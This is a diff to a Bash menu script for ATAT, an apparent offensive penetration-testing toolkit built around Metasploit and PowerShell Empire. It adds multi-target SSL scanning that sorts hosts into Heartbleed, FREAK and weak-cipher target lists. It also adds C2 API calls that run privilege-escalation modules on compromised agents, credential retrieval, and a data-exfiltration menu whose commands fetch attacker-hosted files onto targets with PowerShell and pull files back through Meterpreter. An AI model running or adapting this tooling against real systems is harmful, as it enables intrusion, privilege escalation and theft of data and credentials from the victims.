@@ -3,23 +3,23 @@
 [[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to start your ATAT"; exit 1; }
 resize -s 150 150
 clear                                   # Clear the screen.
-SERVICE=service;
+SERVICE=Postgresql;
 secs=$(date '+%S');
 
-if ps ax | grep -v grep | grep postgresql > /dev/null
+if service postgresql status | grep -v grep | grep running > /dev/null
 then
     echo "$SERVICE service running"
 else
     echo "$SERVICE is not running, Starting service." 
-    sudo service postgresql start
+    service postgresql start
 fi 
-SERVICE1=service;
+SERVICE1=Metasploit;
 if ps ax | grep -v grep | grep metasploit > /dev/null
 then
     echo "$SERVICE1 service running"
 else
     echo "$SERVICE1 is not running, Starting service." 
-    sudo service metasploit start
+    service metasploit start
 fi 
 mkdir ~/Desktop/temp 
 clear
@@ -737,8 +737,8 @@ done
          
 echo -e "\E[1;34m::::: \e[97mScan All The Things!!\E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 6=Main Menu | 7=QUIT: '
-options=("Multi-Port Auxiliary" "Multi-Target SNMP Enumeration" "Multi-Target Load Balancer Detection" "Multi-Target SSLScan" "Multi-Target Masscan of All TCP Ports" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 9=Main Menu | 10=QUIT: '
+options=("Multi-Port Auxiliary" "Multi-Target SNMP Enumeration" "Multi-Target Load Balancer Detection" "Multi-Target SSLScan" "Multi-Target SSLScan - With Masscan Results" "Multi-Target SSLScan - With Nmap Results" "Multi-Target Masscan of All TCP Ports" "Extract All IP:Port Combos From Nmap Output For SSLScan Processing" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -787,7 +787,43 @@ do
             ;;
     "Multi-Target SSLScan")
 	echo -e "\E[1;34m::::: \e[97mMulti-Target SSLScan\E[1;34m:::::"		
+	inputfile=~/ATAT/MSF_targets.txt
+	outputfile=SSLScan_Results.txt
+	for IP in $(cat $inputfile)
+	do
+	sslscan --no-failed --no-rejected --certificate-info --verbose $IP | tee $outputfile
+		
+	cat $outputfile | egrep "Testing|RC4" | grep -B1 RC4 >> rc4.txt
+	cat $outputfile | egrep "Testing|SSLv2" | grep -B1 SSLv2 >> sslv2.txt
+	cat $outputfile | egrep -B1 "Testing|SSLv3|TLSv1.0" >> heartbleed_targets.txt
+	cat $outputfile | egrep "Testing|EXP" | grep -B1 EXP >> freak.txt
+	cat $outputfile | egrep "Testing|40 |56 " | egrep -B1 "40 |56 " >> weak_ciphers.txt
+	cat $outputfile | egrep "Testing|After" | grep -B1 After >> expired_certs.txt
+	cat $outputfile | egrep "Testing|Certificate|Subject|Issuer|valid" | grep -B1 -A4 Certificate >> ssl_certs.txt
+	done
+                echo -e "\E[1;34m::::: \e[97mCheck ATAT Folder for results!\E[1;34m:::::"
+            ;;
+    "Multi-Target SSLScan - With Masscan Results")
+	echo -e "\E[1;34m::::: \e[97mMulti-Target SSLScan\E[1;34m:::::"		
 	inputfile=~SSLScan_masscan_results.txt
+	outputfile=~SSLScan_Results.txt
+	for IP in $(cat $inputfile)
+	do
+	sslscan --no-failed --no-rejected --certificate-info --verbose $IP | tee $outputfile
+		
+	cat $outputfile | egrep "Testing|RC4" | grep -B1 RC4 >> rc4.txt
+	cat $outputfile | egrep "Testing|SSLv2" | grep -B1 SSLv2 >> sslv2.txt
+	cat $outputfile | egrep -B1 "Testing|SSLv3|TLSv1.0" >> heartbleed_targets.txt
+	cat $outputfile | egrep "Testing|EXP" | grep -B1 EXP >> freak.txt
+	cat $outputfile | egrep "Testing|40 |56 " | egrep -B1 "40 |56 " >> weak_ciphers.txt
+	cat $outputfile | egrep "Testing|After" | grep -B1 After >> expired_certs.txt
+	cat $outputfile | egrep "Testing|Certificate|Subject|Issuer|valid" | grep -B1 -A4 Certificate >> ssl_certs.txt
+	done
+                echo -e "\E[1;34m::::: \e[97mCheck ATAT Folder for results!\E[1;34m:::::"
+            ;;
+    "Multi-Target SSLScan - With Nmap Results")
+	echo -e "\E[1;34m::::: \e[97mMulti-Target SSLScan\E[1;34m:::::"		
+	inputfile=SSLScan_nmap_results.txt
 	outputfile=~SSLScan_Results.txt
 	for IP in $(cat $inputfile)
 	do
@@ -851,6 +887,18 @@ select opt in "${options[@]}"
 		esac
 	done
 	        ;;
+	"Extract All IP:Port Combos From Nmap Output For SSLScan Processing")
+	        echo -e "\E[1;34m::::: \e[97mNmap Output From \"Intense\" Scan Profiles Only\E[1;34m:::::"
+	read -p 'Enter Full Path Including File Name Of Nmap Output (/root/output.xml):' useroutput;
+	#cat $useroutput | egrep "Discovered open port" | grep -B1 open >> Open_Ports.txt
+	sed "/Discovered open port /s/Discovered open port /""/g" $useroutput > ~nmap_results1.txt
+	awk -F/ '{ print $2 ":" $1 }' ~nmap_results1.txt > ~nmap_results2.txt
+	sed "/tcp on /s/tcp on /""/g" ~nmap_results2.txt >> ~nmap_results3.txt
+	sed "/ /s/ /""/g" ~nmap_results3.txt >> ~nmap_results4.txt
+	grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{1,5}' ~nmap_results4.txt >> SSLScan_nmap_results.txt
+	rm ~nmap_results*.txt
+            echo -e "\E[1;34m::::: \e[97mNmap Output Has Been Processed. Results Are In ~/ATAT/SSLScan_nmap_results.txt\E[1;34m:::::"
+            ;;
     "Main Menu")
             ~/ATAT-chroot/ATAT.sh
             ;;
@@ -1008,8 +1056,8 @@ echo -e "\E[1;34m::::: \e[97mTHIS SECTION ONLY WORKS FROM THE /root/ CONTEXT!! \
 echo -e "\E[1;34m::::: \e[97mIF YOU'RE NOT LOGGED IN AS root, DO NOT USE THESE OPTIONS!! \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mOnly Launch DeathStar (Step 2) If Your Goal Is To Automate Domain Admin Credential Acquisition \E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 19=Main Menu | 20=QUIT: '
-options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Windows Post-Exploitation" "Linux/OSX Post-Exploitation" "Get Post Ex Results From PSE Agent" "Get PSE Stored Credentials" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 21=Main Menu | 22=QUIT: '
+options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Windows Post-Exploitation" "Linux/OSX Post-Exploitation" "Get Post Ex Results From PSE Agent" "Get PSE Stored Credentials" "Windows Privilege Escalation" "Linux/OSX Privilege Escalation" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1128,6 +1176,30 @@ do
     read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; 
 	curl --insecure -i https://$userlistener:$userport/api/creds?token=$(cat $pseauthtoken) | tee ~/ATAT/PSE_creds.txt	
             echo -e "\E[1;34m::::: \e[97mAgents have been saved to ~/ATAT/PSE_creds.txt \E[1;34m:::::"
+			;;
+		"Windows Privilege Escalation")
+    inputfile=~/ATAT/PSE_windows_privesc.txt
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
+	for MODULE in $(cat $inputfile)
+	do
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Windows_PSE_privesc.log
+	sleep 10
+	done
+            echo -e "\E[1;34m::::: \e[97mxXx Powershell Agent Has Been (Hopefully) Escalated xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
+			;;	
+		"Linux/OSX Privilege Escalation")
+    inputfile=~/ATAT/PSE_linux_osx_privesc.txt
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent;
+	for MODULE in $(cat $inputfile)
+	do
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/$MODULE?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"'}' >> ~/ATAT/Linux_OSX_PSE_privesc.log
+	sleep 10
+	done
+            echo -e "\E[1;34m::::: \e[97mxXx Python Agent Has Been (Hopefully) Escalated xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once All Background Tasks Have Completed\E[1;34m:::::"
 			;;
 		"Kill PSE Listener")
     pseauthtoken=~/ATAT/PSE_perm_token.txt
@@ -1254,6 +1326,56 @@ do
             ;;                 
         "Main Menu")
             ~/ATAT-chroot/ATAT.sh
+            ;;
+        "Quit")
+            echo "Aufiederszehn" && exit 1
+            ;;
+        *) echo invalid option;;
+    esac
+done 
+
+;;
+
+ "11" | "11" )
+         
+ echo -e "\E[1;34m::::: \e[97mData Exfiltration\E[1;34m:::::"
+ 
+PS3='Enter your choice: ENTER=Options Menu | 3=Main Menu | 4=QUIT: '
+options=("Push File To Target with SCP - Creds Required" "Data Exfiltration" "Main Menu" "Quit")
+select opt in "${options[@]}"
+do
+    case $opt in
+		"Push File To Target with SCP - Creds Required")	
+	read -p 'Enter Local File Including Full Path: ' userfile; read -p 'Enter Username On Target Machine: ' username; read -p 'Enter Target Machine Name / IP: ' usermachine; read -p 'Enter File Destination Full Path on Target Machine: ' userpath;
+	scp $userfile $username@$usermachine:$userpath
+		    ;;
+		"Data Exfiltration")	
+	read -p 'Enter Remote File On Target Including Full Path (C:\\\\\Users\\\\\Profile\\\\\filename.ext): ' remoteuserfile; read -p 'Enter File Destination Full Path on Local Machine for MSF (/root/file.ext): ' msflocaluserpath; #read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter Local File Webserver Path (filename.ext): ' webuserfile; read -p 'Enter File Destination Full Path on Local Machine for PSH (%WINDIR%\\System32\\file.ext): ' pshuserpath;
+		#echo -e "\E[1;34m::::: \e[97mWindows Terminal Command\E[1;34m:::::" 
+		#echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/$webuserfile\',\'$pshuserpath\'\)
+		
+        echo -e "\E[1;34m::::: \e[97mMeterpreter Command\E[1;34m:::::" 
+        echo download \"$remoteuserfile\" \"$msflocaluserpath\"
+		    ;;
+		"Push File To Target with PSH / Meterpreter")
+	SERVICE=Apache;
+	secs=$(date '+%S');
+	if service apache2 status | grep -v grep | grep running > /dev/null
+	then
+		echo "$SERVICE service running"
+	else
+		echo "$SERVICE is not running, Starting service." 
+		service apache2 start
+	fi 
+	read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter Local File Including Full Path (/var/www/html/filename.ext): ' localuserfile; read -p 'Enter Local File Webserver Path (filename.ext): ' webuserfile; read -p 'Enter File Destination Full Path on Target Machine for MSF (%WINDIR%\\\\\System32\\\\\file.ext): ' msfuserpath; read -p 'Enter File Destination Full Path on Target Machine for PSH (%WINDIR%\\System32\\file.ext): ' pshuserpath;
+		echo -e "\E[1;34m::::: \e[97mWindows Terminal Command\E[1;34m:::::" 
+		echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/$webuserfile\',\'$pshuserpath\'\)
+			
+        echo -e "\E[1;34m::::: \e[97mMeterpreter Command\E[1;34m:::::" 
+        echo upload $localuserfile $msfuserpath
+            ;;
+        "Main Menu")
+            ~/ATAT/ATAT.sh
             ;;
         "Quit")
             echo "Aufiederszehn" && exit 1
